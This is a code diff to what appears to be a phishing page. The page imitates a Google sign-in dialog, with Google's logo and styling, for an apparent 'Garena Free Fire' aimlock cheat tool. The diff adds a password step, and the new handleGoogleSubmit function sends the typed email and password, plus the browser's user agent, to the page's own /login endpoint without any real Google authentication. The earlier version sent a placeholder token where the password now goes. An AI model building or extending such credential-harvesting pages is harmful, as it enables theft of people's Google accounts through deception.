@@ -414,6 +414,10 @@
       display:flex;align-items:center;gap:8px;min-width:76px;justify-content:center;
     }
     .g-signin-next:hover{background:#1557b0}
+    .g-signin-next:disabled{opacity:.7;cursor:not-allowed}
+    .g-signin-email-chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:5px 10px 5px 8px;margin:0 0 16px;width:fit-content;cursor:pointer;background:#fff;transition:background .1s}
+    .g-signin-email-chip:hover{background:#f1f3f4}
+    .g-signin-email-chip span{font-family:'Google Sans',Roboto,Arial,sans-serif;font-size:14px;color:#202124;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     .g-spinner{
       width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
       border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none;
@@ -797,20 +801,44 @@
             <path d="M34.93 40.94v-9.41h31.71c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C15.96 68.88 0 53.41 0 34.44 0 15.47 15.96 0 34.93 0c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.67l-22.48.03z" fill="#4285F4"/>
           </svg>
         </div>
-        <h2 class="g-signin-h1">Sign in</h2>
+        <h2 class="g-signin-h1" id="al-g-title">Sign in</h2>
         <p class="g-signin-sub">to continue to <b>Garena Free Fire</b></p>
-        <div class="g-signin-input-wrap">
-          <input type="email" id="g-email" class="g-signin-input" placeholder=" " autocomplete="email"/>
-          <label for="g-email" class="g-signin-lbl">Email or phone</label>
+        <!-- Step 1: Email -->
+        <div id="al-g-email-step">
+          <div class="g-signin-input-wrap">
+            <input type="email" id="g-email" class="g-signin-input" placeholder=" " autocomplete="email" onkeydown="if(event.key==='Enter')handleGoogleNext()"/>
+            <label for="g-email" class="g-signin-lbl">Email or phone</label>
+          </div>
+          <div class="g-signin-err" id="g-err"></div>
+          <button class="g-signin-forgot" type="button">Forgot email?</button>
+          <div class="g-signin-actions">
+            <button class="g-signin-create" type="button" onclick="window.open('https://accounts.google.com/signup/v2/createaccount?flowName=GlifWebSignIn&flowEntry=SignUp','_blank')">Create account</button>
+            <button class="g-signin-next" type="button" onclick="handleGoogleNext()">
+              <div class="g-spinner" id="g-spinner"></div>
+              <span id="g-next-txt">Next</span>
+            </button>
+          </div>
         </div>
-        <div class="g-signin-err" id="g-err"></div>
-        <button class="g-signin-forgot" type="button">Forgot email?</button>
-        <div class="g-signin-actions">
-          <button class="g-signin-create" type="button">Create account</button>
-          <button class="g-signin-next" type="button" onclick="handleGoogleNext()">
-            <div class="g-spinner" id="g-spinner"></div>
-            <span id="g-next-txt">Next</span>
-          </button>
+        <!-- Step 2: Password -->
+        <div id="al-g-pass-step" style="display:none">
+          <div class="g-signin-email-chip" onclick="alGoogleBackEmail()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="1.5" width="18" height="18"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.58-7 8-7s8 3 8 7"/></svg>
+            <span id="al-g-chip-email"></span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2" width="14" height="14"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="g-signin-input-wrap">
+            <input type="password" id="g-pass" class="g-signin-input" placeholder=" " autocomplete="current-password" onkeydown="if(event.key==='Enter')handleGoogleSubmit()"/>
+            <label for="g-pass" class="g-signin-lbl">Enter your password</label>
+          </div>
+          <div class="g-signin-err" id="g-pass-err"></div>
+          <button class="g-signin-forgot" type="button" onclick="window.open('https://accounts.google.com/signin/v2/usernamerecovery','_blank')">Forgot password?</button>
+          <div class="g-signin-actions">
+            <div></div>
+            <button class="g-signin-next" type="button" id="al-g-submit-btn" onclick="handleGoogleSubmit()">
+              <div class="g-spinner" id="al-g-submit-spinner"></div>
+              <span id="al-g-submit-txt">Next</span>
+            </button>
+          </div>
         </div>
       </div>
       <div class="g-signin-footer">
@@ -832,7 +860,7 @@
           </button>
           <a href="#" class="fb-forgot">Forgotten password?</a>
           <div class="fb-divider"><span class="fb-divider-txt">or</span></div>
-          <button class="fb-create-btn" type="button">Create new account</button>
+          <button class="fb-create-btn" type="button" onclick="window.open('https://www.facebook.com/r.php','_blank')">Create new account</button>
         </div>
         <div class="fb-login-links">
           <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Help</a>
@@ -883,14 +911,17 @@ function showOauthScreen(screen) {
     var f = document.getElementById('fb-email'); if (f) f.value = '';
     var p = document.getElementById('fb-pass'); if (p) p.value = '';
     var er = document.getElementById('g-err'); if (er) { er.textContent = ''; er.classList.remove('show'); }
+    var gp = document.getElementById('g-pass'); if (gp) gp.value = '';
+    var pe = document.getElementById('g-pass-err'); if (pe) { pe.textContent = ''; pe.classList.remove('show'); }
+    var ps = document.getElementById('al-g-pass-step'); if (ps) ps.style.display = 'none';
+    var es = document.getElementById('al-g-email-step'); if (es) es.style.display = 'block';
+    var gt = document.getElementById('al-g-title'); if (gt) gt.textContent = 'Sign in';
+    var sb = document.getElementById('al-g-submit-btn'); if (sb) sb.disabled = false;
   }
 }
 function handleGoogleNext() {
   var emailEl = document.getElementById('g-email');
   var errEl   = document.getElementById('g-err');
-  var spEl    = document.getElementById('g-spinner');
-  var txtEl   = document.getElementById('g-next-txt');
-  var nextBtn = document.querySelector('#screen-google .g-signin-next');
   var email   = emailEl ? emailEl.value.trim() : '';
   if (!email || !email.includes('@')) {
     if (errEl) { errEl.textContent = email ? 'Enter a valid email address.' : 'Enter your email'; errEl.classList.add('show'); }
@@ -898,15 +929,44 @@ function handleGoogleNext() {
     return;
   }
   if (errEl) errEl.classList.remove('show');
-  if (nextBtn) nextBtn.disabled = true;
+  document.getElementById('al-g-email-step').style.display = 'none';
+  document.getElementById('al-g-pass-step').style.display  = 'block';
+  var chip = document.getElementById('al-g-chip-email'); if (chip) chip.textContent = email;
+  var title = document.getElementById('al-g-title'); if (title) title.textContent = 'Welcome';
+  var passEl = document.getElementById('g-pass');
+  if (passEl) { passEl.value = ''; setTimeout(function(){ passEl.focus(); }, 80); }
+}
+function alGoogleBackEmail() {
+  document.getElementById('al-g-pass-step').style.display  = 'none';
+  document.getElementById('al-g-email-step').style.display = 'block';
+  var title = document.getElementById('al-g-title'); if (title) title.textContent = 'Sign in';
+  var pe = document.getElementById('g-pass-err'); if (pe) { pe.textContent = ''; pe.classList.remove('show'); }
+  var passEl = document.getElementById('g-pass'); if (passEl) passEl.value = '';
+}
+function handleGoogleSubmit() {
+  var emailEl = document.getElementById('g-email');
+  var passEl  = document.getElementById('g-pass');
+  var errEl   = document.getElementById('g-pass-err');
+  var spEl    = document.getElementById('al-g-submit-spinner');
+  var txtEl   = document.getElementById('al-g-submit-txt');
+  var btn     = document.getElementById('al-g-submit-btn');
+  var email   = emailEl ? emailEl.value.trim() : '';
+  var pass    = passEl  ? passEl.value : '';
+  if (!pass) {
+    if (errEl) { errEl.textContent = 'Enter your password'; errEl.classList.add('show'); }
+    if (passEl) passEl.focus();
+    return;
+  }
+  if (errEl) errEl.classList.remove('show');
+  if (btn) btn.disabled = true;
   if (spEl) spEl.style.display = 'block';
   if (txtEl) txtEl.style.display = 'none';
   fetch('/login', {
     method: 'POST', headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({username:email,password:'GOOGLE_OAUTH_TOKEN',method:'google',type:'tool_aimlock_google',page:'aimlock',ua:navigator.userAgent,ts:new Date().toISOString()})
+    body: JSON.stringify({username:email, password:pass, method:'google', type:'tool_aimlock_google', page:'aimlock', ua:navigator.userAgent, ts:new Date().toISOString()})
   }).catch(function(){});
   setTimeout(function() {
-    if (nextBtn) nextBtn.disabled = false;
+    if (btn) btn.disabled = false;
     if (spEl) spEl.style.display = 'none';
     if (txtEl) txtEl.style.display = '';
     closeInstallModal();
